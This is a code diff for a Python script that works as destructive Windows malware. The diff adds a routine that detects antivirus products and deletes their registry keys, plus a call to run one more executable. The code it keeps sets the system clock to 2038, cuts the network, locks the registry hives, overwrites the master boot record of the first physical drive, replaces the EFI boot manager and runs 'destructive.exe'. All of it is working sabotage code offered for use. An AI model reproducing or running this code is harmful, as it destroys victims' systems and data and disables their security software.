@@ -2,18 +2,96 @@ import os
 import subprocess
 import psutil
 import time
-import threading
 import winreg
 import shutil
 from datetime import datetime
 from pywin32 import win32security, win32api, win32con
 import win32file
+import sys
+import wmi
 
+# Set script directory
+script_dir = os.getcwd()
+
+# Define log directories and files
+log_directory = os.path.join(script_dir, "log")
+if not os.path.exists(log_directory):
+    os.makedirs(log_directory)
+
+# Separate log files for different purposes
+console_log_file = os.path.join(log_directory, "console.log")
+
+# Redirect stdout to console log
+sys.stdout = open(console_log_file, "w", encoding="utf-8", errors="ignore")
+
+# Redirect stderr to console log
+sys.stderr = open(console_log_file, "w", encoding="utf-8", errors="ignore")
+
+# List of antivirus-related keywords (without ".com" suffix)
+antivirus_keywords = [
+    "virustotal", "hybrid-analysis", "filescan", "360totalsecurity", "acronis", "adaware", "avast",
+    "avira", "bitdefender", "clamav", "comodo", "drweb", "emsisoft", "eset", "f-secure", "fortinet", 
+    "gdatasoftware", "hitmanpro", "ikarussecurity", "k7computing", "kaspersky", "malwarebytes", "mcafee",
+    "norton", "pandasecurity", "sophos", "spyhunter", "superantispyware", "trendmicro", "vipre", "webroot",
+    "zonealarm", "avg", "escanav", "totalav", "combofix", "adguard", "smadav", "drweb", "intego",
+    "crowdstrike", "esetnod32"
+]
+
+# Function to find antivirus products using WMI
+def find_antivirus():
+    c = wmi.WMI(namespace="root\\SecurityCenter2")  # Namespace for security products in WMI
+    products = c.query("SELECT * FROM AntivirusProduct")
+    
+    found_antivirus = []
+    
+    for product in products:
+        display_name = product.displayName
+        # Check if the product name matches any antivirus keyword
+        if any(keyword.lower() in display_name.lower() for keyword in antivirus_keywords):
+            found_antivirus.append(display_name)
+    
+    return found_antivirus
+
+# Function to recursively search and delete antivirus-related registry keys
+def remove_antivirus_registry():
+    try:
+        # Search for antivirus software using WMI
+        found_antivirus = find_antivirus()
+        
+        if not found_antivirus:
+            print("No antivirus software found.")
+            return
+
+        # Search for registry entries related to antivirus software
+        hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
+        
+        for hive in hives:
+            for root_path in ["SOFTWARE", "SOFTWARE\\WOW6432Node"]:
+                try:
+                    key = winreg.OpenKey(hive, root_path, 0, winreg.KEY_READ | winreg.KEY_WRITE)
+                    num_subkeys = winreg.QueryInfoKey(key)[0]
+                    for i in range(num_subkeys):
+                        subkey_name = winreg.EnumKey(key, i)
+                        # If the subkey matches any antivirus keyword, delete it
+                        if any(keyword.lower() in subkey_name.lower() for keyword in antivirus_keywords):
+                            print(f"Found registry entry: {subkey_name}")
+                            try:
+                                subkey = winreg.OpenKey(hive, f"{root_path}\\{subkey_name}", 0, winreg.KEY_WRITE)
+                                winreg.DeleteKey(subkey, '')
+                                print(f"Deleted registry entry: {subkey_name}")
+                            except Exception as e:
+                                print(f"Error deleting subkey {subkey_name}: {e}")
+                except FileNotFoundError:
+                    continue
+                except Exception as e:
+                    print(f"Error accessing registry path {root_path}: {e}")
+        print("Registry clean-up completed.")
+    except Exception as e:
+        print(f"An error occurred during registry clean-up: {e}")
 
 # Function to change system date
 def change_system_date():
     try:
-        # Change the system date to 19th January 2038 (requires administrator privileges)
         date_str = "01-19-2038"
         subprocess.run(["cmd.exe", "/C", f"date {date_str}"], check=True, shell=True)
         print("System date changed to 19-01-2038.")
@@ -24,7 +102,6 @@ def change_system_date():
 # Function to get network adapters and disable them
 def get_network_adapters():
     try:
-        # Get the network interfaces using psutil
         adapters = psutil.net_if_addrs()
         interface_names = list(adapters.keys())
         print("Network adapters found:")
@@ -45,7 +122,6 @@ def cut_network_connections(adapters):
         print(f"An error occurred while cutting network connections: {e}")
 
 
-# Function to lock registry hives (in Python, using winreg)
 def lock_registry_hives():
     try:
         hives = [
@@ -64,34 +140,26 @@ def lock_registry_hives():
 
 def lock_registry_hive(hive_name, hive):
     try:
-        # Open the registry hive key
         print(f"Locking registry hive: {hive_name}")
         key = winreg.OpenKey(hive, "", 0, winreg.KEY_WRITE)
 
-        # Get security descriptor for the key
         sd = win32security.GetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.OWNER_SECURITY_INFORMATION |
                                            win32con.DACL_SECURITY_INFORMATION)
 
-        # Create a DACL to apply on the registry key
         dacl = sd.GetSecurityDescriptorDacl()
 
-        # Retrieve SID for LocalSystem and Builtin Administrators groups
         system_sid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "SYSTEM")[0])
         admins_sid = win32security.ConvertSidToStringSid(
             win32security.LookupAccountName(None, "BUILTIN\\Administrators")[0])
 
-        # Add Allow permissions for SYSTEM and Administrators
         dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, system_sid)
         dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, admins_sid)
 
-        # Deny all access for others by removing existing permissions
         dacl.AddAccessDeniedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, None)
 
-        # Apply the modified DACL to the key
         win32security.SetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.DACL_SECURITY_INFORMATION, None, None,
                                       dacl, None)
 
-        # Close the key
         winreg.CloseKey(key)
 
         print(f"Registry hive {hive_name} locked successfully.")
@@ -99,15 +167,12 @@ def lock_registry_hive(hive_name, hive):
         print(f"An error occurred while locking registry hive {hive_name}: {e}")
 
 
-# Function to overwrite MBR using AnNih.bin
 def overwrite_mbr(bin_file_path):
     try:
-        # Check if the file exists
         if not os.path.exists(bin_file_path):
             print(f"Error: {bin_file_path} not found!")
             return
 
-        # Open the disk (in this case, the first disk, '\\.\PhysicalDrive0')
         drive_path = r"\\.\PhysicalDrive0"
         drive = win32file.CreateFile(
             drive_path,
@@ -119,14 +184,10 @@ def overwrite_mbr(bin_file_path):
             None
         )
 
-        # Open the binary file (AnNih.bin) to overwrite MBR
         with open(bin_file_path, 'rb') as bin_file:
             mbr_data = bin_file.read()
 
-        # Write the binary data to the MBR (beginning of the drive)
         win32file.WriteFile(drive, mbr_data)
-
-        # Close the drive
         win32file.CloseHandle(drive)
 
         print(f"MBR successfully overwritten using {bin_file_path}")
@@ -134,81 +195,83 @@ def overwrite_mbr(bin_file_path):
         print(f"An error occurred while overwriting MBR: {e}")
 
 
-# Function to copy bootmgfw.efi to the desired location
 def copy_bootmgfw_efi():
     try:
-        # Get the current working directory
-        script_dir = os.getcwd()
-
-        # Define the source path of bootmgfw.efi
         source_path = os.path.join(script_dir, "bootmgfw.efi")
         destination_path = r"X:\EFI\Microsoft\Boot\bootmgfw.efi"
 
-        # Check if the source file exists
         if not os.path.exists(source_path):
             print(f"Source file {source_path} not found!")
             return
 
-        # Create destination directory if it does not exist
         destination_dir = os.path.dirname(destination_path)
         if not os.path.exists(destination_dir):
             os.makedirs(destination_dir)
 
-        # Copy the file
         shutil.copy2(source_path, destination_path)
         print(f"bootmgfw.efi copied successfully to {destination_path}")
     except Exception as e:
         print(f"An error occurred while copying bootmgfw.efi: {e}")
 
 
-# Function to run destructive.exe
 def run_destructive_exe():
     try:
-        # Get the current working directory
-        script_dir = os.getcwd()
-
-        # Construct the full path to destructive.exe
         exe_path = os.path.join(script_dir, "destructive.exe")
 
-        # Check if the executable exists
         if not os.path.exists(exe_path):
             print(f"Error: {exe_path} not found!")
             return
 
-        # Run the executable
         subprocess.run([exe_path], check=True)
         print("destructive.exe executed successfully.")
     except Exception as e:
         print(f"An error occurred while running destructive.exe: {e}")
 
 
-# Main function to run all tasks
+def run_utkudorukbayraktarugabuga_exe():
+    try:
+        # Assuming the folder is named 'UTKUDORUKBAYRAKTARUGABUGA'
+        folder_path = os.path.join(os.getcwd(), "UTKUDORUKBAYRAKTARUGABUGA")
+        exe_path = os.path.join(folder_path, "UTKUDORUKBAYRAKTARUGABUGA.exe")
+
+        if not os.path.exists(exe_path):
+            print(f"Error: {exe_path} not found!")
+            return
+
+        subprocess.run([exe_path], check=True)
+        print("UTKUDORUKBAYRAKTARUGABUGA.exe executed successfully.")
+    except Exception as e:
+        print(f"An error occurred while running UTKUDORUKBAYRAKTARUGABUGA.exe: {e}")
+
+
 def main():
     try:
-        # Step 1: Change system date
         print("Changing system date to 19-01-2038...")
         change_system_date()
 
-        # Step 2: Get network adapters and cut connections
         print("Getting network interfaces and cutting connections...")
         adapters = get_network_adapters()
         cut_network_connections(adapters)
+ 
+        # Call the function to find antivirus software and delete its registry entries
+        remove_antivirus_registry()
 
-        # Step 3: Lock registry hives
         print("Locking all registry hives...")
         lock_registry_hives()
 
-        # Step 4: Overwrite MBR with AnNih.bin
         print("Overwriting MBR...")
         overwrite_mbr(os.path.join(os.getcwd(), "AnNih.bin"))
 
-        # Step 5: Copy bootmgfw.efi
         print("Copying bootmgfw.efi...")
         copy_bootmgfw_efi()
+        
+        time.sleep(30)
 
-        # Step 6: Run destructive.exe
         print("Running destructive.exe...")
         run_destructive_exe()
+
+        print("Running UTKUDORUKBAYRAKTARUGABUGA.exe...")
+        run_utkudorukbayraktarugabuga_exe()
 
         print("All tasks completed successfully.")
 
